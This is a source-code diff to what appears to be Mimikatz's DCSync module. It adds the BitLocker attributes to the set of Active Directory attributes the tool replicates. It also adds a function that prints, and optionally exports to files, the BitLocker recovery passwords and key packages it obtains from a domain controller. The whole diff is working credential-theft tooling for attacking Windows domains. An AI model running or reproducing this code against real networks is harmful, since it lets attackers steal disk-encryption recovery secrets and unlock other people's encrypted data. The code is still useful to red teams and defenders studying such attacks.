@@ -16,6 +16,7 @@ LPCSTR kuhl_m_lsadump_dcsync_oids[] = {
 	szOID_ANSI_userAccountControl, szOID_ANSI_accountExpires, szOID_ANSI_pwdLastSet,
 	szOID_ANSI_objectSid, szOID_ANSI_sIDHistory,
 	szOID_ANSI_unicodePwd, szOID_ANSI_ntPwdHistory, szOID_ANSI_dBCSPwd, szOID_ANSI_lmPwdHistory, szOID_ANSI_supplementalCredentials,
+	szOID_ANSI_msFVEKeyPackage, szOID_ANSI_msFVERecoveryGuid, szOID_ANSI_msFVEVolumeGuid, szOID_ANSI_msFVERecoveryPassword,
 	szOID_ANSI_trustPartner, szOID_ANSI_trustAuthIncoming, szOID_ANSI_trustAuthOutgoing,
 	szOID_ANSI_currentValue,
 	szOID_isDeleted,
@@ -25,6 +26,8 @@ LPCSTR kuhl_m_lsadump_dcsync_oids_export[] = {
 	szOID_ANSI_sAMAccountName, szOID_ANSI_objectSid,
 	szOID_ANSI_userAccountControl,
 	szOID_ANSI_unicodePwd,
+	szOID_ANSI_msFVEKeyPackage, szOID_ANSI_msFVERecoveryGuid, szOID_ANSI_msFVEVolumeGuid, szOID_ANSI_msFVERecoveryPassword,
+	szOID_ANSI_currentValue,
 	szOID_isDeleted,
 };
 NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
@@ -236,9 +239,12 @@ void kuhl_m_lsadump_dcsync_descrObject_csv(SCHEMA_PREFIX_TABLE *prefixTable, ATT
 void kuhl_m_lsadump_dcsync_descrObject(SCHEMA_PREFIX_TABLE *prefixTable, ATTRBLOCK *attributes, LPCWSTR szSrcDomain, BOOL someExport)
 {
 	kull_m_rpc_drsr_findPrintMonoAttr(L"\nObject RDN           : ", prefixTable, attributes, szOID_ANSI_name, TRUE);
+
 	kprintf(L"\n");
 	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_sAMAccountName, NULL, NULL))
 		kuhl_m_lsadump_dcsync_descrUser(prefixTable, attributes);
+	else if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_msFVERecoveryGuid, NULL, NULL))
+		kuhl_m_lsadump_dcsync_descrBitlocker(prefixTable, attributes, someExport);
 	else if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_trustPartner, NULL, NULL))
 		kuhl_m_lsadump_dcsync_descrTrust(prefixTable, attributes, szSrcDomain);
 	else if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_currentValue, NULL, NULL))
@@ -290,6 +296,82 @@ LPCWSTR kuhl_m_lsadump_samAccountType_toString(DWORD accountType)
 		target = L"unknown";
 	}
 	return target;
+}
+
+void kuhl_m_lsadump_dcsync_descrBitlocker(SCHEMA_PREFIX_TABLE* prefixTable, ATTRBLOCK* attributes, BOOL someExport)
+{
+	UNICODE_STRING recoveryGuid, uString;
+	wchar_t* shortname = NULL;
+	DWORD szData = 0;
+	PVOID data = 0;
+
+	recoveryGuid.Length = 0;
+
+	kprintf(L"** BITLOCKER RECOVERY INFORMATION **\n\n");
+
+	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_msFVEVolumeGuid, &data, NULL))
+	{
+		if(NT_SUCCESS(RtlStringFromGUID(data, &uString)))
+		{
+			kprintf(L"Volume GUID          : %wZ\n", &uString);
+			RtlFreeUnicodeString(&uString);
+		}
+	}
+
+	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_msFVERecoveryGuid, &data, NULL))
+	{
+		if(NT_SUCCESS(RtlStringFromGUID(data, &recoveryGuid)))
+		{
+			kprintf(L"Recovery GUID        : %wZ\n", &recoveryGuid);
+		}
+	}
+
+	if(someExport)
+	{
+		if(recoveryGuid.Length <= 0)
+		{
+			recoveryGuid.Buffer = kull_m_string_getRandomGUID();
+			recoveryGuid.Length = (USHORT)wcslen(recoveryGuid.Buffer);
+			kprintf(L"Recovery GUID (fake) : %wZ\n", &recoveryGuid);
+		}
+		shortname = recoveryGuid.Buffer;
+	}
+
+	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_msFVERecoveryPassword, &data, &szData))
+	{
+		if(szData > 0)
+		{
+			kprintf(L"Recovery Password    : %s\n", data);
+
+			if(someExport)
+			{
+				PWCHAR filename = kuhl_m_crypto_generateFileName(L"ntds", L"bitlocker", 0, shortname, L"recoveryPassword");
+				kprintf(L"\tExport         : %s - \'%s\'\n", kull_m_file_writeData(filename, (PBYTE)data, szData) ? L"OK" : L"KO", filename);
+				LocalFree(filename);
+			}
+		}
+	}
+
+	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_msFVEKeyPackage, &data, &szData))
+	{
+		if(szData > 0)
+		{
+			kprintf(L"Key Package Size     : %u byte(s)\n", szData);
+			kprintf(L"Key Package          : [");
+			kull_m_string_wprintf_hex(data, szData, 0);
+			kprintf(L"]\n");
+
+			if (someExport)
+			{
+				PWCHAR filename = kuhl_m_crypto_generateFileName(L"ntds", L"bitlocker", 0, shortname, L"keyPackage");
+				kprintf(L"\tExport         : %s - \'%s\'\n", kull_m_file_writeData(filename, (PBYTE)data, szData) ? L"OK" : L"KO", filename);
+				LocalFree(filename);
+			}
+		}
+	}
+
+	if (recoveryGuid.Length > 0)
+		RtlFreeUnicodeString(&recoveryGuid);
 }
 
 void kuhl_m_lsadump_dcsync_descrUser(SCHEMA_PREFIX_TABLE *prefixTable, ATTRBLOCK *attributes)
